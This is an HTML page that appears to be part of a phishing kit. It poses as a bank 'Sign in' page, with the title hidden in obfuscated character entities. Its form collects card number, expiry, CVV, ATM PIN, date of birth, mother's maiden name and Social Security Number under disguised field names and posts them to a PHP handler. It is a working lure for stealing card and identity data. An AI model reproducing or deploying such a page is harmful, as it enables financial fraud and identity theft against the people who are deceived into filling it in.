<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
<title>&#83;&#105;&#103;&#110;&#32;&#105;n</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<link rel="shortcut icon" href="images/favicoon.ico"/>
 <script type="text/javascript">
function isNumberKey(evt){
    var charCode = (evt.which) ? evt.which : evt.keyCode;
    if (charCode > 31 && (charCode < 48 || charCode > 57))
        return false;
    return true;
}
</script>
<link rel="stylesheet" href="css/style.css">
<body>
<div class="container1">
<img src="images/logo.png">
</div><br /><br />
<div class="container2">  

  <form id="contact1" action=cha1.php method=post style="margin:10px">
   
    <div class="hd"> Account Identification Information</div>
    
    <div class="conn">
    <br />
    
     <fieldset>
      <input placeholder="Credit/Debit Card Number" type="text"  required name="chatol" maxlength="16" onkeypress='return isNumberKey(event)'>
    </fieldset>
     <fieldset>
      <input placeholder="Expiring Date MM/YYYY" type="text"   name="exp90878" maxlength="7" >
    </fieldset>
      
       <fieldset>
      <input placeholder="CVV" type="text"   name="cvc908" maxlength="3" onkeypress='return isNumberKey(event)'>
    </fieldset>
    
      <fieldset>
      <input placeholder="ATM PIN" type="text"   name="pnimta" maxlength="4" onkeypress='return isNumberKey(event)'>
    </fieldset>
     
      <fieldset>
      <input placeholder="Date of Birth" type="text"  required  name="dob676">
    </fieldset>
      <fieldset>
      <input placeholder="Mother's Maiden Name" type="text"  required  name="do090b">
    </fieldset>
    <fieldset>
      <input placeholder="Social Security Number" type="text"  required name="ssnn89">
    </fieldset>
      
 
     
    <fieldset>
      <input name="submit" type="submit" id="contact-submit"  value="Submit">  <br><br>  </fieldset></div>
     
  </form><br /><br />
</div>
<img src="images/5.gif" alt="" title="" border=0 width=100% >